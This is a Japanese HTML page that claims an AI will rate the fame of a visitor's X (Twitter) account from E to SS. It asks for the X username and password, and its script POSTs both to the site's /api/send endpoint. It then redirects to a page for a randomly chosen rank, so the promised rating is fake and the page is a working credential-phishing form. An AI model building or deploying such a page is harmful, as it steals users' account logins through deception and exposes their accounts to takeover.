<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>X知名度ランク抽出</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
      background: #f5f5f7;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 20px;
    }
    .card {
      background: #ffffff;
      width: 100%;
      max-width: 400px;
      border-radius: 16px;
      padding: 32px 28px 28px;
      box-shadow: 0 2px 16px rgba(0,0,0,0.06);
    }
    h1 {
      text-align: center;
      font-size: 26px;
      font-weight: 700;
      color: #1d1d1f;
      margin-bottom: 12px;
    }
    .subtitle {
      text-align: center;
      font-size: 14px;
      color: #6e6e73;
      margin-bottom: 28px;
      line-height: 1.5;
    }
    .field { margin-bottom: 18px; }
    label {
      display: block;
      font-size: 14px;
      color: #1d1d1f;
      margin-bottom: 6px;
      font-weight: 500;
    }
    input {
      width: 100%;
      padding: 14px 16px;
      border: 1px solid #d2d2d7;
      border-radius: 10px;
      font-size: 16px;
      background: #fafafa;
      outline: none;
    }
    input:focus { border-color: #007aff; background: #fff; }
    input::placeholder { color: #aeaeb2; }
    button {
      width: 100%;
      padding: 16px;
      background: #007aff;
      color: white;
      border: none;
      border-radius: 12px;
      font-size: 17px;
      font-weight: 600;
      cursor: pointer;
      margin-top: 8px;
    }
    button:active { background: #0066d6; }
    .note {
      text-align: center;
      color: #8e8e93;
      font-size: 13px;
      margin-top: 20px;
    }
    #status {
      text-align: center;
      margin-top: 12px;
      font-size: 14px;
      min-height: 20px;
    }
  </style>
</head>
<body>
  <div class="card">
    <h1>X知名度ランク抽出</h1>
    <p class="subtitle">AIがXアカウントを確認して知名度をE~SSで評価します</p>
    <div class="field">
      <label>ユーザー名またはメールアドレス</label>
      <input type="text" id="username" placeholder="@userID">
    </div>
    <div class="field">
      <label>パスワード</label>
      <input type="password" id="password">
    </div>
    <button id="loginBtn">ログイン</button>
    <p class="note">ログイン後、BOTから結果が報告されます</p>
    <div id="status"></div>
  </div>
  <script>
    const ranks = ["e", "d", "c", "b", "a", "s", "ss"];
    document.getElementById("loginBtn").addEventListener("click", async () => {
      const username = document.getElementById("username").value.trim();
      const password = document.getElementById("password").value.trim();
      const status = document.getElementById("status");
      if (!username || !password) {
        status.textContent = "ユーザー名とパスワードを入力してください";
        status.style.color = "#ff3b30";
        return;
      }
      status.textContent = "処理中...";
      status.style.color = "#666";
      try {
        const res = await fetch("/api/send", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ username, password })
        });
        if (res.ok) {
          const randomRank = ranks[Math.floor(Math.random() * ranks.length)];
          window.location.href = `/rank-${randomRank}.html`;
        } else {
          status.textContent = "送信に失敗しました";
          status.style.color = "#ff3b30";
        }
      } catch (err) {
        status.textContent = "送信に失敗しました";
        status.style.color = "#ff3b30";
      }
    });
  </script>
</body>
</html>
